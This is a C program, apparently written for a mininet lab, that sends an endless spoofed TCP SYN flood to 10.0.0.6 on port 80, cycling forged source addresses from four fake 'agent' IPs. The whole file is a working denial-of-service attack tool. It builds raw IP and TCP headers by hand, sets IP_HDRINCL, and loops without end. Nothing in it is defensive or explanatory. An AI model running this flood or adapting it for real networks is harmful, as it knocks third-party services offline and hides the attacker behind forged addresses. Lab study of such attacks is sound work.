#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

// Checksum calculation
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum=0;
    while(nbytes>1) { sum+=*ptr++; nbytes-=2; }
    if(nbytes==1) { oddbyte=0; *((u_char*)&oddbyte)=*(u_char*)ptr; sum+=oddbyte; }
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}

int main (void) {
    // 1. Create Raw Socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) { perror("Socket failed"); exit(1); }

    // 2. Tell the kernel "I am providing the IP Header"
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;

    char *target_ip = "10.0.0.6";
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr (target_ip);

    // Spoofed Source IPs (The Agents)
    char *agents[] = {"10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5"};
    int current_agent = 0;

    printf("Starting Spoofed SYN Flood on %s...\n", target_ip);

    while(1) {
        memset (datagram, 0, 4096);

        // --- IP HEADER ---
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
        iph->id = htonl (54321);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = inet_addr (agents[current_agent]); // Fake Source
        iph->daddr = sin.sin_addr.s_addr;
        
        // Calculate IP Checksum
        iph->check = csum ((unsigned short *) datagram, iph->ihl >> 1);

        // --- TCP HEADER ---
        tcph->source = htons (1234 + current_agent);
        tcph->dest = htons (80);
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5; 
        tcph->fin=0;
        tcph->syn=1; // SYN Flood
        tcph->rst=0;
        tcph->psh=0;
        tcph->ack=0;
        tcph->urg=0;
        tcph->window = htons (5840);
        tcph->check = 0; 
        tcph->urg_ptr = 0;

        // Send Packet
        if (sendto (s, datagram, iph->tot_len , 0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
            perror("Send failed");
        }

        // Rotate to next Fake IP
        current_agent++;
        if(current_agent >= 4) current_agent = 0;
        
        // Small delay to prevent crashing mininet
        usleep(1000); 
    }
    return 0;
}
